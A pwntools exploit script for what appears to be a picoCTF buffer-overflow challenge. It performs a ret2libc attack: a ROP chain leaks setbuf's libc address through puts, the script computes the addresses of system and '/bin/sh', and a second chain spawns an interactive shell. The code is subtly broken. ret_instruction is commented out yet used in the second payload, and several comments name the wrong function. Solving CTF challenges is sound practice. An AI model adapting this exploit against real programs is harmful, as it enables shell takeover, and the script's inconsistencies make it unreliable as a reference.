#!/usr/bin/env python3

from pwn import *

context.binary = binary = './vuln'

vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')

p = process('./vuln')
#p = remote("mercury.picoctf.net",1774)
gdb.attach(p) # to debug ROP chain

offset = 136
# get from gdb/gef using pattern create <large number> then; pattern offset @rdi
junk = b'A' * offset
# now that we know what the overflow point is we create an overflow string in bytes

"""
* Use puts to leak to an address
* supply arguments to puts
* Use ROP to do this
** need to use x86 calling conventions to do this (https://en.wikipedia.org/wiki/X86_calling_conventions)
use ROPgadget to get pop rdi IOT modify rdi = 0x0000000000400913 : pop rdi ; ret

* After our leak, we can calculate the offset from the offset between the fuction
we leaked and the function we want
(ie. getting the difference between that address and system address)
"""

pop_rdi = 0x400913
# get from ROPgadget
setbuf_at_got = 0x601028
# get from Ghidra .got.plt (Global Offset Table)
puts_at_plt = 0x400540
# get from Ghidra .plt (Procedure Linkage Table)
back_to_main = 0x400771
# get from Ghidra main function

payload = [
    junk,
    # call puts to display/leak the true scanf address
    p64(pop_rdi),
    p64(setbuf_at_got),
    p64(puts_at_plt),
    # jump back to a safe place so we dont crash
    p64(back_to_main),
    # p64() is used as the binary is a 64 bit binary so we pack the "addresses"
]

payload = b"".join(payload)
p.sendline(payload)
# command to send payload to the binary/give input

p.recvline()
p.recvline()
# added so that the leak variale recieves the memory leak
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
# strip gets rid of the new line formatting in the return of leak
# ljust adds 8 null bytes
log.info(f"{hex(leak)=}")


setbuf_offset = 0x88540
# use readelf -s libc.so.6 | grep puts (-s prints symbols) to get the puts Offset
base_address_of_libc = leak - setbuf_offset
log.info(f"{hex(base_address_of_libc)=}")

system_offset = 0x4f4e0
# use readelf
system_address = base_address_of_libc + system_offset

bin_sh_offset = 0x1b40fa
# use Ghidra on libc.so.6
bin_sh_address = base_address_of_libc + bin_sh_offset

#ret_instruction = 0x40052e
# Use ROPgadget --binary vuln | grep ": ret"
## We do this to find the first return instruction.

second_payload = [
    junk,
    p64(pop_rdi),
    p64(bin_sh_address),
    p64(ret_instruction),
    # ret added for stack alignment
    p64(system_address),
]

second_payload = b"".join(second_payload)
p.sendline(second_payload)


p.interactive()